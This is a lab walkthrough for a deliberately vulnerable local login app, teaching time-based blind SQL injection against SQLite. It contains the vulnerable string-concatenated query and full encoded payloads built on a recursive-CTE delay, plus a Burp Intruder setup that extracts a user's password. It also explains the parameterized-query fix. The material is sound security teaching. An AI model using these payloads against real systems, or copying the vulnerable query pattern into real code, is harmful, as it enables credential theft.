# Walkthrough — sqli-blind-time

## 1. Context

The app exposes a single-page login. You type a username and password on `/`, the form submits a `POST /login` request, and the server queries a `users` table in SQLite for a row matching both fields. But unlike a normal login, the response is **always the same page**, returned with HTTP 200 and a fixed body:

```
Login attempt processed.
```

Correct credentials, wrong credentials, garbage — every request gets that one neutral message. A developer flattened the old "Welcome" / "Invalid credentials" pages into a single response to stop username enumeration. That is a legitimate hardening, and it does kill the boolean-based oracle: there is no longer any text in the body that differs between a true and a false condition. What it does **not** do is fix the SQL injection underneath — and that leaves exactly one observable channel open: **time**.

Three users are seeded (`alice`, `bob`, `carol`); alice's password is `wonderland`. Alongside `users` the same database file holds a `secrets` table mirroring atom-01's schema, kept here for recognition but not the target of this atom's exploit.

> **See the premise once, in the browser.** Open <http://127.0.0.1:8007/> and sign in as `alice` / `wonderland`. You get `Login attempt processed.` — the *same* page you'd get with any wrong password. There is no visible "success". That uniform response is the whole premise of this atom. From here on, everything happens in Burp.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/login` view builds its SQL like this:

```python
username = request.form.get("username", "")
password = request.form.get("password", "")
# VULNERABLE: user input concatenated into SQL string
query = (
    f"SELECT username FROM users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
conn.execute(query).fetchone()  # result intentionally ignored — response is uniform
return render_template("result.html")
```

It is the same class of bug as [`sqli-union-basic`](../sqli-union-basic/) and [`sqli-blind-boolean`](../sqli-blind-boolean/) — user input pasted into a SQL string with f-strings, no escaping, no parameter binding. What changed is the last two lines. In `sqli-blind-boolean` the view branched on whether `fetchone()` returned a row and rendered one of two pages; that branch *was* the oracle. Here the row is fetched and **thrown away**, and the template is the same no matter what. The query still runs — that matters in a moment — but its result can no longer steer the response.

So the attacker has the same injection capability and **no oracle in the body at all**. Both response states the boolean attack relied on have collapsed into one byte-for-byte identical page. The only thing an injected condition can still influence is how long the query takes to run, and therefore how long the client waits. That is the channel this whole walkthrough rides on.

## 3. Exploitation via Burp Suite

This atom is worked entirely in Burp Suite (Proxy → Repeater → Intruder). The web interface exists only as a legitimate destination for the requests.

The login form on `/` issues a `POST /login` whose body is form-encoded as `username=<...>&password=<...>`. Build that request in a new Repeater tab targeting `127.0.0.1:8007` and send it once with the seeded credentials (`username=alice&password=wonderland`): the response comes back instantly with `Login attempt processed.`. Note the response time — Burp shows it at the bottom of the Response panel, a couple of milliseconds. That fast, uniform response is your baseline. Every step below edits the body and re-sends, and the only thing you watch is **how long the response takes**.

> **Notation convention.** `N`, `P`, and `C` name the values you sweep — a candidate length, a character position, a candidate character. Each payload below already has them filled in with a concrete value (e.g. `N = 10`); to sweep, you edit just that one number or letter and re-send (don't paste a literal `N`/`P`/`C`). The delay expression is the opposite: it appears **in full in every payload**, byte-for-byte identical every time, with nothing inside to substitute — `K`, the `18000` in it, is that fixed, pre-calibrated constant, not something you vary.

### A note on encoding the body

The previous atoms covered the basics: spaces become `%20`, and inside a form-encoded value the structural characters `=` (`%3D`), `&` (`%26`), and `%` (`%25`) must be encoded. This atom adds one more that bites hard if you miss it:

- **`+` must be encoded as `%2B`.** In an `application/x-www-form-urlencoded` body, a literal `+` decodes to a *space*. The delay expression below contains `x+1`; if you paste it raw, the server receives `x 1`, the SQL breaks, and you get an error instead of a delay. Every `+` in the body has to travel as `%2B`.

Quotes (`'` → `%27`), parentheses, commas, asterisks, and the `<` operator are legal inside a value and can travel as-is. As before, you can either type the minimum encoding by hand or paste the decoded payload and press **Ctrl+U** in Repeater. Each step below shows a **Body (decoded)** for reading and a **Body (Burp-ready)** ready to paste.

### The SQLite delay primitive — why there's no `SLEEP()`

Time-based blind SQLi needs a way to make the database burn time *on demand*. In most engines you reach for a built-in: MySQL has `SLEEP(n)`, PostgreSQL has `pg_sleep(n)`, MSSQL has `WAITFOR DELAY`. **SQLite has none of them.** This is the moment where knowing your backend decides your payload: against SQLite you have to *build* the delay out of work the engine will actually do.

The primitive used here is a small recursive CTE cross-joined against itself:

```
(WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b)
```

The CTE builds a tiny table `t` of `K = 18000` rows, then `count(*) FROM t a, t b` counts the `K²` ≈ 324 million pairs of the cross join. Counting that many pairs is pure CPU work and takes a few seconds, but the memory stays flat: the only thing materialized is the `K`-row table (tens of KB), never the `K²` pairs. `K = 18000` was calibrated against this lab's container (SQLite 3.46.1) to land around **3–4 seconds** per run; the exact number is CPU-dependent, so if your delays come back much shorter or longer, adjust `K` (time grows with `K²`, so small changes move it a lot). What matters is never the absolute number — it is the *contrast* between seconds and milliseconds. You will see this exact block, in full, inside every payload below — it is never abbreviated.

### Step 1 — Prove the injection *and* discover the only channel

There is no debug block, no error, no row to read — so the first probe has to be the delay itself. Inject the expression unconditionally and watch the clock.

Body (decoded):

```
username=alice' AND (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) -- &password=x
```

Body (Burp-ready):

```
username=alice%27%20AND%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20--%20&password=x
```

Send. The page comes back as always — `Login attempt processed.` — but only **after a ~3–4 second pause**. Read what executed:

```sql
SELECT username FROM users WHERE username = 'alice' AND (WITH RECURSIVE t(x) AS (...) SELECT count(*) FROM t a, t b) -- ' AND password = 'x'
```

The `'` closes the username literal; `--` comments out the trailing `' AND password = 'x'`. `alice` matches one row (it's a real user, indexed), the `AND` forces the engine to evaluate the cross-join subquery, and counting 18000² pairs burns the seconds. The count is non-zero so the row technically matches, but that's irrelevant — the body is uniform regardless.

This is the conceptual heart of the atom. In `sqli-blind-boolean`, *confirming the injection* (the login-bypass in its Step 1) and *establishing the oracle* (its Steps 2–3) were separate moves, because there was a body signal from the very first request. Here there is no body signal, ever — so the **first evidence that injection exists is already a delay**. Confirming the bug and establishing the oracle are the same act. Time is the channel from the first probe.

**What this is not:** a single slow response proves nothing on its own — it could be network jitter or a busy server. The proof is *repeatability and control*. Re-send this payload two or three times: it stalls every time. Then send the benign `username=alice&password=wonderland` again: instant. The signal of time-based blind is not "the response was slow", it's "I can make the response slow on demand, and make it fast again on demand." Step 2 turns that control into a yes/no oracle.

### Step 2 — Make the delay conditional (the temporal oracle)

Wrap the delay in a `CASE` so it only fires when a condition is true. SQLite's `CASE` evaluates only the branch whose `WHEN` matched, so the expensive expression in the `THEN` runs only on a true condition.

Body (decoded) — true branch:

```
username=alice' AND (SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
```

Body (Burp-ready) — true branch:

```
username=alice%27%20AND%20(SELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20ELSE%201%20END)%20--%20&password=x
```

Send: **~3–4 second** delay. Now change the single condition `1=1` to `1=2` (Burp-ready: `1%3D2`) and send again: the response is **instant**. The `ELSE 1` branch returns a constant, the cross-join never runs, no time is burned.

You now hold both states of the oracle, read off the clock instead of the page:

- condition **true** → response stalls a few seconds
- condition **false** → response is instant

Any yes/no question you can phrase in SQL can now be answered by dropping it into the `WHEN (...)` slot and timing the response. This is the temporal twin of `sqli-blind-boolean`'s Step 2/3: the *question* sits in exactly the same place; only the thing that *answers* it changed — latency, not text.

### Step 3 — Extract the password length by timing

Swap the placeholder condition for one about real data: is alice's password length equal to `N`? Start with one concrete probe asking whether the length is 10.

Body (decoded):

```
username=alice' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='alice') = 10) THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
```

Body (Burp-ready):

```
username=alice%27%20AND%20(SELECT%20CASE%20WHEN%20((SELECT%20LENGTH(password)%20FROM%20users%20WHERE%20username%3D%27alice%27)%20%3D%2010)%20THEN%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20ELSE%201%20END)%20--%20&password=x
```

Iterate the number in place (in Repeater, edit just the `10`) and time each response:

- `... = 5)  ...` → instant (length is not 5)
- `... = 10) ...` → **~3–4 second delay** (length is 10)
- `... = 15) ...` → instant

Conclusion: alice's password is **10 characters** long. You learned a fact about data you cannot read, purely from response latency. Doing two or three probes by hand is enough to feel the rhythm before the next step scales it up.

### Step 4 — Extract one character by timing

Finer question: is the character at position `P` equal to candidate `C`? `SUBSTR(password, P, 1)` pulls one character; the comparison turns it into the single bit the timer reveals. Start by probing the first character (`P = 1`) against candidate `w`.

Body (decoded):

```
username=alice' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'w') THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
```

Body (Burp-ready):

```
username=alice%27%20AND%20(SELECT%20CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27alice%27),1,1)%20%3D%20%27w%27)%20THEN%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20ELSE%201%20END)%20--%20&password=x
```

By hand on the first character: as sent above, candidate `'w'` makes the response stall **~3–4 seconds** — so the first character is `w`. Swap it for any other letter (`'a'`, `'b'`, …) and the response returns instantly.

The two numeric arguments of `SUBSTR` play distinct roles, and the distinction matters for the next step. The first (`1`) is the *position* — which character to read, the one you sweep to walk the whole password. The second (`1`) is the *length* — how many characters to read, always 1.

### Step 5 — Automate with Burp Intruder, reading the latency column

This is where you reuse `sqli-blind-boolean` almost verbatim. The Intruder setup is **identical** to that atom — same attack type, same two payload sets — with exactly **one** difference: which column you read as the oracle. There, it was a Grep — Match checkbox. Here, every response body is byte-for-byte identical, so there is no string to match; the oracle is the **response time column**.

Base request (the working Step 4 payload), with the two payload positions marked `§...§`:

```
username=alice' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§') THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
```

(Menu names below are Burp Community Edition; Pro is identical.)

1. **Send to Intruder.** Right-click the working Repeater request → **Send to Intruder**, then switch to the Intruder tab. Make sure the body still has `x%2B1` inside the delay expression — Intruder sends the base request's static text as-is, so a raw `+` here would decode to a space and break the burn just like in Repeater.
2. **Mark two payload positions** with `§...§`: the **position** argument of `SUBSTR` (the first `1`, sweeps `1` → `10`) and the **candidate** character (the `w`, sweeps `a` → `z`). **Do not** mark the `1` *length* argument of `SUBSTR`, nor any digit of the `18000` in the delay expression — there are several literal digits in the payload, and marking the wrong one breaks the attack.
3. **Attack type:** `Cluster bomb` — the Cartesian product of the two payload sets, every position combined with every candidate.
4. **Payload set 1 (the position):** `Numbers`, **From `1`, To `10`, Step `1`** — 10 payloads. **Start at `1`, not `0`.** SQLite indexes strings from 1: `SUBSTR(password, 1, 1)` is the first character, while `SUBSTR(password, 0, 1)` returns the empty string, which never equals any candidate letter. A range that starts at `0` therefore makes that position come back *fast* for every letter — no hit, no error to tell you why, and the attack just looks broken. The range has to be `1`–`10`.
5. **Payload set 2 (the candidate):** `Simple list`, the 26 lowercase letters, one per line. (Don't use `Brute forcer` — it explodes into 26ⁿ.) Request count: **260** (10 × 26).
6. **Set the oracle to time, and serialize the attack.** This is the only departure from `sqli-blind-boolean`. There is no Grep — Match to add, because all 260 responses are identical. Instead read the **`Response received`** column (time to first byte, in milliseconds; `Response completed` works too) — enable it from the results-table column menu if it isn't shown. And open **Resource pool** and set **Maximum concurrent requests = 1**: the payloads burn CPU, and several running at once would compete for it and smear the timing signal. One at a time keeps every measurement clean. (Burp Community also throttles Intruder, which only adds a constant offset to every request — the seconds-vs-milliseconds gap is untouched.)
7. **Start attack.** Sort the results by the `Response received` column, descending. **10 rows stand out at ~3–4 seconds**, one per position; the other 250 come back in milliseconds. Read the slow rows in position order: `w, o, n, d, e, r, l, a, n, d` → `wonderland`.

That's alice's stored password, recovered without it — or any difference in the response except the clock — ever appearing.

The attack is, by nature, **slower** than the boolean one: each bit costs a few seconds in the worst case, and concurrency is pinned to 1. But the result is identical. The oracle was never in the body; it was on the clock.

### Why this is time-based — the trilogy, end to end

The cause of the bug is identical across all three injection atoms: user input concatenated into a SQL string with no parameter binding. What differs is what the attacker can observe, and therefore the shape of the exploit.

In `sqli-union-basic` the data came back in the body directly. In `sqli-blind-boolean` the body only said yes-or-no (`Welcome` vs `Invalid`), but it still said *something*. Here the body says **nothing** — it is identical on every request. A developer flattened the messages to stop enumeration (a good instinct) but never fixed the injection, so the boolean oracle died and the attacker moved to the clock. The same question `sqli-blind-boolean` answered by reading text — "is the character at position P equal to C?" — this atom answers with a stopwatch. Same root cause, same secret (`wonderland`), same fix; only the observable channel shrank again, from content to time.

## 4. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. In short: the fixed version calls `conn.execute("... WHERE username = ? AND password = ?", (username, password))`. With placeholders, the SQLite driver parses the SQL statement first — without the input — and only then binds each value as literal data. The entire timing payload, cross join and all, arrives as the *value* of `username`; it is never parsed as SQL and never executes.

Point Repeater at the fixed app on port **8107** and re-send any payload from section 3 — but mind one Burp gotcha first. Editing the port inside the request text does **not** change where the request goes: Repeater sends to the destination held in the **Target** field (the control just above the request editor, showing something like `http://127.0.0.1:8007`), and the host/port you see inside the request lines is only text. Click that **Target** control and change the port to **8107** there. If you only edit the request body or the `Host` line, the request still hits the vulnerable app on 8007, the delay still fires, and the fix looks like it failed. With the Target actually pointing at 8107, every payload returns `Login attempt processed.` **instantly** — including the unconditional Step 1 probe, which against the vulnerable app stalled for seconds. The uniform message is unchanged; that flattened response was legitimate anti-enumeration, never the bug. What the attacker lost is the ability to inject anything the engine will spend time on. With no controllable delay, the timing channel is gone — the same way the parameterized fix closed the body channel in `sqli-union-basic` and the boolean channel in `sqli-blind-boolean`. One root cause, one fix, three exploits.
